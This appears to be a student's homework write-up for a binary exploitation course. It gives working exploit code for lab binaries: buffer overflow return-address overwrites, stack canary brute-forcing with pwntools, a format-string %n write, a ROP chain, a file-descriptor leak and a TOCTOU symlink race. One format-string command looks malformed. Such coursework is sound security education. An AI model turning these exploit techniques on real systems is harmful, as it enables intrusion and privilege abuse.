# Homework 2
> User: `testing`
## Arithmetic Overflow
### Solution
sizes: `0804a060` (int) `24736` (overflow) `40799`

scanf(): `080484b0`

win(): `080485e6` (int) `134514150`
### Code

### Help Received

---

## Buffer Overflow
### Solution
Overloaded `gets()` function by trying with variations of length of `A`

### Code
```bash
python -c "print 'A'*44+'\xe6\x85\x04\x08'" | ./vuln
```

### Help Received
- [Buffer Overflow Attack](http://www.cse.scu.edu/~tschwarz/coen152_05/Lectures/BufferOverflow.html)

---

## Canary
### Solution
Canary: `_0^3`

Win address: `0x080486f6`
### Code
To get canary
```python
from pwn import *

for i in range(33, 127):
    proc = process('./vuln')
    proc.sendline('33')
    proc.sendline('a' * 32 + chr(i))
    ans = proc.recvall()
    if('Ok' in ans):
        print('Got it: ' + ans)
```

To get flag:
```py
from pwn import *

proc = process('./vuln')
proc.sendline('56')
proc.sendline('a' * 32 + '_0^3' + 'a' * 16 + '\xf6\x86\x04\x08')
ans = proc.recvall()

print('Got it: ' + ans)
```

### Help Received
- https://youtu.be/4Eir5gsSIM8

---

## File Descriptor Leak
### Solution
Find the file descriptor used by `vuln`, and read from it within the spawned bash shell

### Code
```bash
./vuln & ls -l /proc/$!/fd
read -u 4 a
echo $a
```
### Help Received
- Kyle Hutto in the GroupMe
- https://www.computerhope.com/unix/bash/read.htm
- https://www.cyberciti.biz/tips/linux-procfs-file-descriptors.html

---

## FMT-1
### Solution
Under `main`, looked for the filler addresses and found the one not listed in `leaky.c`

### Code
```bash
objdump -d leaky
```

### Help Received
From **Homework 2** description: 
>  This is a simple format string vulnerability. Find the key (a four byte hex value) on the stack. You have the source code, so you should be able to recognize it based on its neighbors.
---

## FMT-2
### Solution
Authenticated Address: `0x0804a040`
Used `%n` format specifier to write a value to the address `0x0804a040`

### Code
```bash
python -c 'print "\x40\xa0\x04\x08", %7$n' | ./vuln
```

### Help Received
- https://youtu.be/gzLPVkZbaPA

---

## ROP
### Solution
Had to find the addresses of `win_function1`, `win_function2`, `flag`, `pop; ret`, and `pop; pop; ret`

Piped in the instructions generated from the code below into `./vuln`

### Code
```py
buffer = 'A' * 28
win_function1 = '\xe6\x85\x04\x08'
win_function2 = '\xfd\x85\x04\x08'
pop_ret = '\x96\x88\x04\x08'
pop_pop_ret = '\x7a\x88\x04\x08'
bad = '\xAD\xAA\xAA\xBA'
flag = '\x6f\x86\x04\x08'
dead_bad = '\xAD\xBA\xAD\xDE'
print(buffer + win_function1 + win_function2 + pop_pop_ret + bad + dead_bad + flag + pop_ret + dead_bad)
```

Piped into `./vuln`

### Help Received
- https://www.youtube.com/watch?v=x8yVQrII5ng

---

## TOCTOU
### Solution
Created a file called `h`

Ran `vuln` and passed the filename `h`

During the 1 second waiting period, I removed the file `h` and replaced it with a symbolic link to `flag.txt`

### Code
```bash
./vuln

rm h && ln -s /problems/toctou_14_e7128c59c8f820595cdfbbbffdbdec35/flag.txt h
```

### Help Received
- Piazza